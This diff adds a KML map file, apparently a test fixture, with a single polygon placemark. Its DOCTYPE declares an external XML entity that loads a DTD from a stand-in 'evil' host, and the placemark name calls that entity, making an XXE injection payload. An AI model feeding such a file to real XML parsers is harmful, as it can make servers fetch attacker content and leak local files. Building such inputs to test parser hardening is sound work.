@@ -1,0 +1,16 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE kml [
+  <!ENTITY xxe SYSTEM "http://example.invalid/evil.dtd">
+]>
+<kml xmlns="http://www.opengis.net/kml/2.2">
+  <Document>
+    <Placemark>
+      <name>&xxe;</name>
+      <Polygon>
+        <outerBoundaryIs><LinearRing><coordinates>
+          36.80,-1.30,0 36.81,-1.30,0 36.81,-1.31,0 36.80,-1.31,0 36.80,-1.30,0
+        </coordinates></LinearRing></outerBoundaryIs>
+      </Polygon>
+    </Placemark>
+  </Document>
+</kml>
